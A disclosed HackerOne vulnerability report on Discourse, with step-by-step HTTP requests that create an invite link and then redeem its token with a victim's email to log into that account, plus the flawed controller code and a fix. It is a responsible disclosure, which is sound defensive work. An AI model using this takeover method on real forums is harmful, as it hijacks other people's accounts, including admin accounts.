# Any user with invite capabilities can take-over any account on Discourse

## Report Details
- **Report ID**: 242765
- **URL**: https://hackerone.com/reports/242765
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-06-23T21:39:36.043Z
- **Disclosed**: 2017-11-06T06:35:52.922Z

## Reporter
- **Username**: mishre
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: discourse

## Vulnerability Information
## Description
Users with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml)  can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.

## Steps to reproduce
1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).
2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:
```
POST http://localhost:4000/invites/link HTTP/1.1
Host: localhost:4000
Connection: keep-alive
Content-Length: 35
Origin: http://localhost:4000
X-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==
Discourse-Visible: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://localhost:4000/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2
Cookie: {redacted}

email=testingmichaelreiz@gmail.coma
```
you"ll receive the following response:
```
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Discourse-Username: {some-user}
X-Discourse-Route: invites/create_invite_link
Cache-Control: no-store, must-revalidate, private, max-age=0
Content-Type: application/json; charset=utf-8
Set-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax
Set-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax
Set-Cookie: __profilin=p%3Dt; path=/
X-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc
X-Runtime: 1.912866
X-MiniProfiler-Ids: ["jfv6h7gfji19eekx7p57","nsqp68md79y8tusrn8rn","4s5fo1o25vp9l7954ybm","blf2ua82vyc0n9683jwb","fe5d5qfugyl5u0hjp7ez","3s7hzl7imehtnono8p18","dmmjnggyftilvg882j9q","bwvs5enxy6pqockcxael","tfu1fnjp7hi5e0nxhqwf"]
Content-Length: 64

"http://localhost:3000/invites/{some-token}"
```
Now copy the token for a use in the later steps - don't click the link.
3) Now open a new incognito tab and launch the following url:
```
http://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com
```
You should now be logged in to the victim's account.

## Resolution
You should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:
```
    invite = Invite.find_by(invite_key: params[:token])

    if invite.present?
      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)
      if user.present?
        log_on_user(user)
```

## Impact
Any user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.

## Attachments
No attachments
